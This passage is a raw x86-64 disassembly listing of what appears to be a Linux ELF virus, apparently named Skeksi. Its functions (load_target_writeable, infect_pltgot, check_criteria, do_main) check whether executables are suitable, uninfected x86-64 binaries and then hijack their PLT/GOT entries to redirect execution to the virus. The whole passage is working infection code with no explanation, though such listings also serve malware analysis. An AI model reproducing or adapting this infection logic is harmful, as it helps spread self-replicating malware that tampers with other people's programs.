  40171c:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401723:	48 8b 48 50          	mov    rcx,QWORD PTR [rax+0x50]
  401727:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  40172e:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
  401732:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401735:	48 63 d0             	movsxd rdx,eax
  401738:	48 89 d0             	mov    rax,rdx
  40173b:	48 c1 e0 03          	shl    rax,0x3
  40173f:	48 29 d0             	sub    rax,rdx
  401742:	48 c1 e0 03          	shl    rax,0x3
  401746:	48 01 f0             	add    rax,rsi
  401749:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  40174d:	48 8d 14 01          	lea    rdx,[rcx+rax*1]
  401751:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401758:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  40175c:	90                   	nop
  40175d:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401761:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401768:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40176b:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  40176f:	0f b7 c0             	movzx  eax,ax
  401772:	39 45 fc             	cmp    DWORD PTR [rbp-0x4],eax
  401775:	0f 8c 30 fe ff ff    	jl     4015ab <load_target_writeable+0x14d>
  40177b:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401782:	48 8b 95 60 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xa0]
  401789:	48 8b 8d 68 ff ff ff 	mov    rcx,QWORD PTR [rbp-0x98]
  401790:	48 89 50 68          	mov    QWORD PTR [rax+0x68],rdx
  401794:	48 89 48 70          	mov    QWORD PTR [rax+0x70],rcx
  401798:	48 8b 95 70 ff ff ff 	mov    rdx,QWORD PTR [rbp-0x90]
  40179f:	48 8b 8d 78 ff ff ff 	mov    rcx,QWORD PTR [rbp-0x88]
  4017a6:	48 89 50 78          	mov    QWORD PTR [rax+0x78],rdx
  4017aa:	48 89 88 80 00 00 00 	mov    QWORD PTR [rax+0x80],rcx
  4017b1:	48 8b 55 80          	mov    rdx,QWORD PTR [rbp-0x80]
  4017b5:	48 8b 4d 88          	mov    rcx,QWORD PTR [rbp-0x78]
  4017b9:	48 89 90 88 00 00 00 	mov    QWORD PTR [rax+0x88],rdx
  4017c0:	48 89 88 90 00 00 00 	mov    QWORD PTR [rax+0x90],rcx
  4017c7:	48 8b 55 90          	mov    rdx,QWORD PTR [rbp-0x70]
  4017cb:	48 8b 4d 98          	mov    rcx,QWORD PTR [rbp-0x68]
  4017cf:	48 89 90 98 00 00 00 	mov    QWORD PTR [rax+0x98],rdx
  4017d6:	48 89 88 a0 00 00 00 	mov    QWORD PTR [rax+0xa0],rcx
  4017dd:	48 8b 55 a0          	mov    rdx,QWORD PTR [rbp-0x60]
  4017e1:	48 8b 4d a8          	mov    rcx,QWORD PTR [rbp-0x58]
  4017e5:	48 89 90 a8 00 00 00 	mov    QWORD PTR [rax+0xa8],rdx
  4017ec:	48 89 88 b0 00 00 00 	mov    QWORD PTR [rax+0xb0],rcx
  4017f3:	48 8b 55 b0          	mov    rdx,QWORD PTR [rbp-0x50]
  4017f7:	48 8b 4d b8          	mov    rcx,QWORD PTR [rbp-0x48]
  4017fb:	48 89 90 b8 00 00 00 	mov    QWORD PTR [rax+0xb8],rdx
  401802:	48 89 88 c0 00 00 00 	mov    QWORD PTR [rax+0xc0],rcx
  401809:	48 8b 55 c0          	mov    rdx,QWORD PTR [rbp-0x40]
  40180d:	48 8b 4d c8          	mov    rcx,QWORD PTR [rbp-0x38]
  401811:	48 89 90 c8 00 00 00 	mov    QWORD PTR [rax+0xc8],rdx
  401818:	48 89 88 d0 00 00 00 	mov    QWORD PTR [rax+0xd0],rcx
  40181f:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  401823:	48 8b 4d d8          	mov    rcx,QWORD PTR [rbp-0x28]
  401827:	48 89 90 d8 00 00 00 	mov    QWORD PTR [rax+0xd8],rdx
  40182e:	48 89 88 e0 00 00 00 	mov    QWORD PTR [rax+0xe0],rcx
  401835:	48 8b 55 e0          	mov    rdx,QWORD PTR [rbp-0x20]
  401839:	48 8b 4d e8          	mov    rcx,QWORD PTR [rbp-0x18]
  40183d:	48 89 90 e8 00 00 00 	mov    QWORD PTR [rax+0xe8],rdx
  401844:	48 89 88 f0 00 00 00 	mov    QWORD PTR [rax+0xf0],rcx
  40184b:	48 8b 45 90          	mov    rax,QWORD PTR [rbp-0x70]
  40184f:	48 89 c2             	mov    rdx,rax
  401852:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401859:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  40185d:	b8 00 00 00 00       	mov    eax,0x0
  401862:	c9                   	leave  
  401863:	c3                   	ret    

0000000000401864 <infect_pltgot>:
  401864:	55                   	push   rbp
  401865:	48 89 e5             	mov    rbp,rsp
  401868:	48 83 ec 70          	sub    rsp,0x70
  40186c:	48 89 7d 98          	mov    QWORD PTR [rbp-0x68],rdi
  401870:	48 89 75 90          	mov    QWORD PTR [rbp-0x70],rsi
  401874:	c7 45 b4 00 00 00 00 	mov    DWORD PTR [rbp-0x4c],0x0
  40187b:	c7 45 f8 ff ff ff ff 	mov    DWORD PTR [rbp-0x8],0xffffffff
  401882:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401886:	48 8b 40 18          	mov    rax,QWORD PTR [rax+0x18]
  40188a:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
  40188e:	48 c7 45 c0 00 00 00 	mov    QWORD PTR [rbp-0x40],0x0
  401895:	00 
  401896:	48 c7 45 b8 00 00 00 	mov    QWORD PTR [rbp-0x48],0x0
  40189d:	00 
  40189e:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4018a5:	e9 67 01 00 00       	jmp    401a11 <infect_pltgot+0x1ad>
  4018aa:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4018ad:	48 98                	cdqe   
  4018af:	48 c1 e0 04          	shl    rax,0x4
  4018b3:	48 89 c2             	mov    rdx,rax
  4018b6:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  4018ba:	48 01 d0             	add    rax,rdx
  4018bd:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4018c0:	48 83 f8 17          	cmp    rax,0x17
  4018c4:	0f 87 43 01 00 00    	ja     401a0d <infect_pltgot+0x1a9>
  4018ca:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
  4018d1:	00 
  4018d2:	48 8d 05 77 15 00 00 	lea    rax,[rip+0x1577]        # 402e50 <display_skeksi+0xa9>
  4018d9:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
  4018dc:	48 63 d0             	movsxd rdx,eax
  4018df:	48 8d 05 6a 15 00 00 	lea    rax,[rip+0x156a]        # 402e50 <display_skeksi+0xa9>
  4018e6:	48 01 d0             	add    rax,rdx
  4018e9:	ff e0                	jmp    rax
  4018eb:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4018ef:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4018f3:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4018f6:	48 98                	cdqe   
  4018f8:	48 c1 e0 04          	shl    rax,0x4
  4018fc:	48 89 c1             	mov    rcx,rax
  4018ff:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401903:	48 01 c8             	add    rax,rcx
  401906:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40190a:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40190e:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  401912:	48 29 c1             	sub    rcx,rax
  401915:	48 89 c8             	mov    rax,rcx
  401918:	48 01 d0             	add    rax,rdx
  40191b:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  40191f:	e9 e9 00 00 00       	jmp    401a0d <infect_pltgot+0x1a9>
  401924:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401928:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  40192c:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401930:	48 8b 48 40          	mov    rcx,QWORD PTR [rax+0x40]
  401934:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401937:	48 98                	cdqe   
  401939:	48 c1 e0 04          	shl    rax,0x4
  40193d:	48 89 c6             	mov    rsi,rax
  401940:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401944:	48 01 f0             	add    rax,rsi
  401947:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
  40194b:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40194f:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  401953:	48 29 c6             	sub    rsi,rax
  401956:	48 89 f0             	mov    rax,rsi
  401959:	48 01 c8             	add    rax,rcx
  40195c:	48 01 d0             	add    rax,rdx
  40195f:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  401963:	e9 a5 00 00 00       	jmp    401a0d <infect_pltgot+0x1a9>
  401968:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40196c:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401970:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401973:	48 98                	cdqe   
  401975:	48 c1 e0 04          	shl    rax,0x4
  401979:	48 89 c1             	mov    rcx,rax
  40197c:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401980:	48 01 c8             	add    rax,rcx
  401983:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401987:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40198b:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  40198f:	48 29 c1             	sub    rcx,rax
  401992:	48 89 c8             	mov    rax,rcx
  401995:	48 01 d0             	add    rax,rdx
  401998:	48 89 45 d8          	mov    QWORD PTR [rbp-0x28],rax
  40199c:	eb 6f                	jmp    401a0d <infect_pltgot+0x1a9>
  40199e:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4019a1:	48 98                	cdqe   
  4019a3:	48 c1 e0 04          	shl    rax,0x4
  4019a7:	48 89 c2             	mov    rdx,rax
  4019aa:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  4019ae:	48 01 d0             	add    rax,rdx
  4019b1:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  4019b5:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  4019b9:	eb 52                	jmp    401a0d <infect_pltgot+0x1a9>
  4019bb:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4019bf:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4019c3:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4019c6:	48 98                	cdqe   
  4019c8:	48 c1 e0 04          	shl    rax,0x4
  4019cc:	48 89 c1             	mov    rcx,rax
  4019cf:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  4019d3:	48 01 c8             	add    rax,rcx
  4019d6:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4019da:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4019de:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  4019e2:	48 29 c1             	sub    rcx,rax
  4019e5:	48 89 c8             	mov    rax,rcx
  4019e8:	48 01 d0             	add    rax,rdx
  4019eb:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  4019ef:	eb 1c                	jmp    401a0d <infect_pltgot+0x1a9>
  4019f1:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4019f4:	48 98                	cdqe   
  4019f6:	48 c1 e0 04          	shl    rax,0x4
  4019fa:	48 89 c2             	mov    rdx,rax
  4019fd:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401a01:	48 01 d0             	add    rax,rdx
  401a04:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401a08:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  401a0c:	90                   	nop
  401a0d:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401a11:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a14:	48 98                	cdqe   
  401a16:	48 c1 e0 04          	shl    rax,0x4
  401a1a:	48 89 c2             	mov    rdx,rax
  401a1d:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401a21:	48 01 d0             	add    rax,rdx
  401a24:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401a27:	48 85 c0             	test   rax,rax
  401a2a:	0f 85 7a fe ff ff    	jne    4018aa <infect_pltgot+0x46>
  401a30:	48 83 7d f0 00       	cmp    QWORD PTR [rbp-0x10],0x0
  401a35:	74 07                	je     401a3e <infect_pltgot+0x1da>
  401a37:	48 83 7d e0 00       	cmp    QWORD PTR [rbp-0x20],0x0
  401a3c:	75 0a                	jne    401a48 <infect_pltgot+0x1e4>
  401a3e:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401a43:	e9 af 01 00 00       	jmp    401bf7 <infect_pltgot+0x393>
  401a48:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401a4f:	eb 47                	jmp    401a98 <infect_pltgot+0x234>
  401a51:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a54:	48 63 d0             	movsxd rdx,eax
  401a57:	48 89 d0             	mov    rax,rdx
  401a5a:	48 01 c0             	add    rax,rax
  401a5d:	48 01 d0             	add    rax,rdx
  401a60:	48 c1 e0 03          	shl    rax,0x3
  401a64:	48 89 c2             	mov    rdx,rax
  401a67:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  401a6b:	48 01 d0             	add    rax,rdx
  401a6e:	8b 00                	mov    eax,DWORD PTR [rax]
  401a70:	89 c2                	mov    edx,eax
  401a72:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  401a76:	48 01 d0             	add    rax,rdx
  401a79:	48 8d 35 c8 13 00 00 	lea    rsi,[rip+0x13c8]        # 402e48 <display_skeksi+0xa1>
  401a80:	48 89 c7             	mov    rdi,rax
  401a83:	e8 3e 12 00 00       	call   402cc6 <_strcmp>
  401a88:	85 c0                	test   eax,eax
  401a8a:	75 08                	jne    401a94 <infect_pltgot+0x230>
  401a8c:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a8f:	89 45 f8             	mov    DWORD PTR [rbp-0x8],eax
  401a92:	eb 2b                	jmp    401abf <infect_pltgot+0x25b>
  401a94:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401a98:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a9b:	48 63 d0             	movsxd rdx,eax
  401a9e:	48 89 d0             	mov    rax,rdx
  401aa1:	48 01 c0             	add    rax,rax
  401aa4:	48 01 d0             	add    rax,rdx
  401aa7:	48 c1 e0 03          	shl    rax,0x3
  401aab:	48 89 c2             	mov    rdx,rax
  401aae:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  401ab2:	48 01 d0             	add    rax,rdx
  401ab5:	8b 00                	mov    eax,DWORD PTR [rax]
  401ab7:	89 c0                	mov    eax,eax
  401ab9:	48 39 45 d0          	cmp    QWORD PTR [rbp-0x30],rax
  401abd:	73 92                	jae    401a51 <infect_pltgot+0x1ed>
  401abf:	83 7d f8 ff          	cmp    DWORD PTR [rbp-0x8],0xffffffff
  401ac3:	75 0a                	jne    401acf <infect_pltgot+0x26b>
  401ac5:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401aca:	e9 28 01 00 00       	jmp    401bf7 <infect_pltgot+0x393>
  401acf:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401ad6:	e9 c4 00 00 00       	jmp    401b9f <infect_pltgot+0x33b>
  401adb:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401ade:	48 63 d0             	movsxd rdx,eax
  401ae1:	48 89 d0             	mov    rax,rdx
  401ae4:	48 01 c0             	add    rax,rax
  401ae7:	48 01 d0             	add    rax,rdx
  401aea:	48 c1 e0 03          	shl    rax,0x3
  401aee:	48 89 c2             	mov    rdx,rax
  401af1:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401af5:	48 01 d0             	add    rax,rdx
  401af8:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401afc:	48 c1 e8 20          	shr    rax,0x20
  401b00:	48 89 c2             	mov    rdx,rax
  401b03:	48 89 d0             	mov    rax,rdx
  401b06:	48 01 c0             	add    rax,rax
  401b09:	48 01 d0             	add    rax,rdx
  401b0c:	48 c1 e0 03          	shl    rax,0x3
  401b10:	48 89 c2             	mov    rdx,rax
  401b13:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  401b17:	48 01 d0             	add    rax,rdx
  401b1a:	8b 00                	mov    eax,DWORD PTR [rax]
  401b1c:	89 c2                	mov    edx,eax
  401b1e:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  401b22:	48 01 d0             	add    rax,rdx
  401b25:	48 8d 35 1c 13 00 00 	lea    rsi,[rip+0x131c]        # 402e48 <display_skeksi+0xa1>
  401b2c:	48 89 c7             	mov    rdi,rax
  401b2f:	e8 92 11 00 00       	call   402cc6 <_strcmp>
  401b34:	85 c0                	test   eax,eax
  401b36:	75 63                	jne    401b9b <infect_pltgot+0x337>
  401b38:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401b3b:	48 63 d0             	movsxd rdx,eax
  401b3e:	48 89 d0             	mov    rax,rdx
  401b41:	48 01 c0             	add    rax,rax
  401b44:	48 01 d0             	add    rax,rdx
  401b47:	48 c1 e0 03          	shl    rax,0x3
  401b4b:	48 89 c2             	mov    rdx,rax
  401b4e:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401b52:	48 01 d0             	add    rax,rdx
  401b55:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401b58:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
  401b5c:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401b60:	48 8b 48 40          	mov    rcx,QWORD PTR [rax+0x40]
  401b64:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401b67:	48 63 d0             	movsxd rdx,eax
  401b6a:	48 89 d0             	mov    rax,rdx
  401b6d:	48 01 c0             	add    rax,rax
  401b70:	48 01 d0             	add    rax,rdx
  401b73:	48 c1 e0 03          	shl    rax,0x3
  401b77:	48 89 c2             	mov    rdx,rax
  401b7a:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401b7e:	48 01 d0             	add    rax,rdx
  401b81:	48 8b 10             	mov    rdx,QWORD PTR [rax]
  401b84:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401b88:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  401b8c:	48 29 c2             	sub    rdx,rax
  401b8f:	48 89 d0             	mov    rax,rdx
  401b92:	48 01 c8             	add    rax,rcx
  401b95:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  401b99:	eb 2b                	jmp    401bc6 <infect_pltgot+0x362>
  401b9b:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401b9f:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401ba2:	48 63 c8             	movsxd rcx,eax
  401ba5:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401ba9:	48 ba ab aa aa aa aa 	movabs rdx,0xaaaaaaaaaaaaaaab
  401bb0:	aa aa aa 
  401bb3:	48 f7 e2             	mul    rdx
  401bb6:	48 89 d0             	mov    rax,rdx
  401bb9:	48 c1 e8 04          	shr    rax,0x4
  401bbd:	48 39 c1             	cmp    rcx,rax
  401bc0:	0f 82 15 ff ff ff    	jb     401adb <infect_pltgot+0x277>
  401bc6:	48 83 7d c0 00       	cmp    QWORD PTR [rbp-0x40],0x0
  401bcb:	75 07                	jne    401bd4 <infect_pltgot+0x370>
  401bcd:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401bd2:	eb 23                	jmp    401bf7 <infect_pltgot+0x393>
  401bd4:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401bd8:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401bdc:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  401be0:	48 01 d0             	add    rax,rdx
  401be3:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  401be7:	48 8b 45 a0          	mov    rax,QWORD PTR [rbp-0x60]
  401beb:	48 8b 55 90          	mov    rdx,QWORD PTR [rbp-0x70]
  401bef:	48 89 10             	mov    QWORD PTR [rax],rdx
  401bf2:	b8 00 00 00 00       	mov    eax,0x0
  401bf7:	c9                   	leave  
  401bf8:	c3                   	ret    

0000000000401bf9 <check_criteria>:
  401bf9:	55                   	push   rbp
  401bfa:	48 89 e5             	mov    rbp,rsp
  401bfd:	48 81 ec d0 10 00 00 	sub    rsp,0x10d0
  401c04:	48 89 bd 38 ef ff ff 	mov    QWORD PTR [rbp-0x10c8],rdi
  401c0b:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
  401c12:	48 8b 85 38 ef ff ff 	mov    rax,QWORD PTR [rbp-0x10c8]
  401c19:	ba 00 00 00 00       	mov    edx,0x0
  401c1e:	be 00 00 00 00       	mov    esi,0x0
  401c23:	48 89 c7             	mov    rdi,rax
  401c26:	e8 44 05 00 00       	call   40216f <_open>
  401c2b:	89 45 f0             	mov    DWORD PTR [rbp-0x10],eax
  401c2e:	83 7d f0 00          	cmp    DWORD PTR [rbp-0x10],0x0
  401c32:	79 0a                	jns    401c3e <check_criteria+0x45>
  401c34:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c39:	e9 27 01 00 00       	jmp    401d65 <check_criteria+0x16c>
  401c3e:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
  401c41:	48 98                	cdqe   
  401c43:	48 8d 8d 40 ef ff ff 	lea    rcx,[rbp-0x10c0]
  401c4a:	ba 00 10 00 00       	mov    edx,0x1000
  401c4f:	48 89 ce             	mov    rsi,rcx
  401c52:	48 89 c7             	mov    rdi,rax
  401c55:	e8 61 05 00 00       	call   4021bb <_read>
  401c5a:	85 c0                	test   eax,eax
  401c5c:	79 0a                	jns    401c68 <check_criteria+0x6f>
  401c5e:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c63:	e9 fd 00 00 00       	jmp    401d65 <check_criteria+0x16c>
  401c68:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
  401c6b:	89 c7                	mov    edi,eax
  401c6d:	e8 2f 05 00 00       	call   4021a1 <_close>
  401c72:	48 8d 85 40 ef ff ff 	lea    rax,[rbp-0x10c0]
  401c79:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  401c7d:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c81:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  401c85:	48 8d 95 40 ef ff ff 	lea    rdx,[rbp-0x10c0]
  401c8c:	48 01 d0             	add    rax,rdx
  401c8f:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  401c93:	48 8d 85 40 ef ff ff 	lea    rax,[rbp-0x10c0]
  401c9a:	ba 04 00 00 00       	mov    edx,0x4
  401c9f:	48 89 c6             	mov    rsi,rax
  401ca2:	48 8d 3d 07 12 00 00 	lea    rdi,[rip+0x1207]        # 402eb0 <display_skeksi+0x109>
  401ca9:	e8 74 10 00 00       	call   402d22 <_memcmp>
  401cae:	85 c0                	test   eax,eax
  401cb0:	74 0a                	je     401cbc <check_criteria+0xc3>
  401cb2:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401cb7:	e9 a9 00 00 00       	jmp    401d65 <check_criteria+0x16c>
  401cbc:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401cc0:	48 83 c0 09          	add    rax,0x9
  401cc4:	8b 00                	mov    eax,DWORD PTR [rax]
  401cc6:	89 45 dc             	mov    DWORD PTR [rbp-0x24],eax
  401cc9:	81 7d dc 25 5d 01 00 	cmp    DWORD PTR [rbp-0x24],0x15d25
  401cd0:	75 0a                	jne    401cdc <check_criteria+0xe3>
  401cd2:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401cd7:	e9 89 00 00 00       	jmp    401d65 <check_criteria+0x16c>
  401cdc:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401ce0:	0f b7 40 10          	movzx  eax,WORD PTR [rax+0x10]
  401ce4:	66 83 f8 02          	cmp    ax,0x2
  401ce8:	74 07                	je     401cf1 <check_criteria+0xf8>
  401cea:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401cef:	eb 74                	jmp    401d65 <check_criteria+0x16c>
  401cf1:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401cf5:	0f b7 40 12          	movzx  eax,WORD PTR [rax+0x12]
  401cf9:	66 83 f8 3e          	cmp    ax,0x3e
  401cfd:	74 07                	je     401d06 <check_criteria+0x10d>
  401cff:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401d04:	eb 5f                	jmp    401d65 <check_criteria+0x16c>
  401d06:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401d0d:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  401d14:	eb 2d                	jmp    401d43 <check_criteria+0x14a>
  401d16:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  401d19:	48 63 d0             	movsxd rdx,eax
  401d1c:	48 89 d0             	mov    rax,rdx
  401d1f:	48 c1 e0 03          	shl    rax,0x3
  401d23:	48 29 d0             	sub    rax,rdx
  401d26:	48 c1 e0 03          	shl    rax,0x3
  401d2a:	48 89 c2             	mov    rdx,rax
  401d2d:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  401d31:	48 01 d0             	add    rax,rdx
  401d34:	8b 00                	mov    eax,DWORD PTR [rax]
  401d36:	83 f8 02             	cmp    eax,0x2
  401d39:	75 04                	jne    401d3f <check_criteria+0x146>
  401d3b:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401d3f:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  401d43:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401d47:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  401d4b:	0f b7 c0             	movzx  eax,ax
  401d4e:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  401d51:	7c c3                	jl     401d16 <check_criteria+0x11d>
  401d53:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
  401d57:	75 07                	jne    401d60 <check_criteria+0x167>
  401d59:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401d5e:	eb 05                	jmp    401d65 <check_criteria+0x16c>
  401d60:	b8 00 00 00 00       	mov    eax,0x0
  401d65:	c9                   	leave  
  401d66:	c3                   	ret    

0000000000401d67 <do_main>:
  401d67:	55                   	push   rbp
  401d68:	48 89 e5             	mov    rbp,rsp
  401d6b:	48 81 ec 60 83 00 00 	sub    rsp,0x8360
  401d72:	48 89 bd a8 7c ff ff 	mov    QWORD PTR [rbp-0x8358],rdi
  401d79:	48 c7 45 90 00 00 00 	mov    QWORD PTR [rbp-0x70],0x0
  401d80:	00 
  401d81:	48 c7 45 e8 00 00 00 	mov    QWORD PTR [rbp-0x18],0x0
  401d88:	00 
  401d89:	c7 45 f8 04 00 00 00 	mov    DWORD PTR [rbp-0x8],0x4
  401d90:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
  401d97:	48 8d 05 17 11 00 00 	lea    rax,[rip+0x1117]        # 402eb5 <display_skeksi+0x10e>
  401d9e:	48 89 85 e0 7c ff ff 	mov    QWORD PTR [rbp-0x8320],rax
  401da5:	48 8d 05 0f 11 00 00 	lea    rax,[rip+0x110f]        # 402ebb <display_skeksi+0x114>
  401dac:	48 89 85 e8 7c ff ff 	mov    QWORD PTR [rbp-0x8318],rax
  401db3:	48 8d 05 0b 11 00 00 	lea    rax,[rip+0x110b]        # 402ec5 <display_skeksi+0x11e>
  401dba:	48 89 85 f0 7c ff ff 	mov    QWORD PTR [rbp-0x8310],rax
  401dc1:	48 8d 05 02 11 00 00 	lea    rax,[rip+0x1102]        # 402eca <display_skeksi+0x123>
  401dc8:	48 89 85 f8 7c ff ff 	mov    QWORD PTR [rbp-0x8308],rax
  401dcf:	c6 85 de 7c ff ff 2e 	mov    BYTE PTR [rbp-0x8322],0x2e
  401dd6:	c6 85 df 7c ff ff 00 	mov    BYTE PTR [rbp-0x8321],0x0
  401ddd:	b9 00 00 00 00       	mov    ecx,0x0
  401de2:	ba 00 00 00 00       	mov    edx,0x0
  401de7:	be 00 00 00 00       	mov    esi,0x0
  401dec:	bf 00 00 00 00       	mov    edi,0x0
